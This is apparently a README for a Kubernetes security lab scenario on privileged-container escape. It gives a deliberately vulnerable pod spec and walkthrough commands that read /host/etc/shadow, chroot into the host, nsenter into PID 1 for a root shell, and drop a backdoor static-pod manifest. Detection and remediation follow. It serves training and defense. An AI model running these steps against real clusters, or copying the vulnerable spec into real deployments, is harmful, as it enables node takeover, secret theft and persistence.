# Scenario 02 — Privileged Container → Node Escape

| | |
|---|---|
| **Vuln class** | Workload hardening / container isolation |
| **Difficulty** | ⭐⭐ Easy–Medium |
| **Backends** | kind ✅ (escape lands in the node *container*)  AKS ✅ (escape lands on the node *VM*) |
| **Namespace** | `priv-esc` |
| **MITRE ATT&CK for Containers** | [T1611 Escape to Host](https://attack.mitre.org/techniques/T1611/) |

## What it is
A pod runs with `privileged: true`, `hostPID`, `hostNetwork`, `hostIPC`, and the
host root filesystem mounted at `/host`. Each of these alone weakens isolation;
together they mean the container is effectively running on the node.

## Why it matters
`privileged: true` grants all Linux capabilities and raw device access, disabling
the seccomp/AppArmor/capability boundaries that separate a container from its
host. Combined with `hostPID`, an attacker can `nsenter` into host PID 1 and run
commands as root on the node — then reach every other pod scheduled there,
steal their secrets, and (on cloud) reach the node's identity/metadata.

## Deploy just this scenario
```powershell
kubectl apply -f scenarios/02-privileged-container-escape/manifest.yaml
# or:  ./reset.ps1 -Scenarios 02-privileged-container-escape
```

## Exploit walkthrough
```powershell
$pod = kubectl -n priv-esc get pod -l app=privileged-app -o jsonpath='{.items[0].metadata.name}'
kubectl -n priv-esc exec -it $pod -- sh
```
Inside the pod, three independent escape paths:

**A) Mounted host filesystem — read/write the node directly**
```bash
ls /host/etc/kubernetes            # node's kubelet config, manifests
cat /host/etc/shadow               # you can read (and write) host files
chroot /host sh                    # now your shell IS the node fs
```

**B) hostPID + nsenter — become host init (PID 1)**
```bash
# Alpine's base image does not include nsenter; add util-linux in this disposable pod.
apk add --no-cache util-linux
# privileged + hostPID lets us enter the host's namespaces via PID 1.
nsenter --target 1 --mount --uts --ipc --net --pid -- sh
id       # root on the node; `ps aux` shows ALL host/other-pod processes
```

**C) Write a static-pod manifest (persistence)**
```bash
# The kubelet auto-runs anything dropped here as a pod on the node.
cp /my-backdoor.yaml /host/etc/kubernetes/manifests/
```

## What success looks like
- `chroot /host` or `nsenter --target 1` gives a root shell whose `ps aux`
  lists host processes from outside the container.
- You can read files that don't exist in the container image (e.g.
  `/host/etc/shadow`, kubelet's `/var/lib/kubelet/pods/...` with other pods'
  secrets).

## Detection
- **Falco** (installed by `tooling/install.ps1`): ships with rules that fire immediately here —
  *"Launch Privileged Container"*, *"Change thread namespace"* (nsenter), and
  *"Read sensitive file untrusted"* (`/etc/shadow`).
- **Audit log**: pod `create` at Metadata shows `securityContext.privileged`,
  `hostPID`, and a `hostPath` volume of `/` — a high-signal combination.
- **kubescape / kube-bench**: fail controls for privileged containers, host
  namespaces, and hostPath mounts.

## Remediation
Drop every host-level escalation. Run as non-root, read-only, no privilege
escalation, minimal capabilities. Enforce cluster-wide with **Pod Security
Admission** (`restricted`) and/or an OPA/Kyverno policy.

**Before (vulnerable):**
```yaml
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
    - securityContext: { privileged: true, allowPrivilegeEscalation: true }
  volumes:
    - name: host-root
      hostPath: { path: / }
```
**After (fixed):**
```yaml
spec:
  # no hostPID/hostNetwork/hostIPC, no hostPath volume
  containers:
    - securityContext:
        privileged: false
        allowPrivilegeEscalation: false
        runAsNonRoot: true
        runAsUser: 10001
        readOnlyRootFilesystem: true
        capabilities: { drop: ["ALL"] }
        seccompProfile: { type: RuntimeDefault }
```
Namespace enforcement:
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: priv-esc
  labels:
    pod-security.kubernetes.io/enforce: restricted
```

## Suggested order
Do this **second**, right after Scenario 01. It reuses the "privileged pod"
pivot from 01 and is the foundation for the host-socket (03) and hostPath (04)
scenarios.
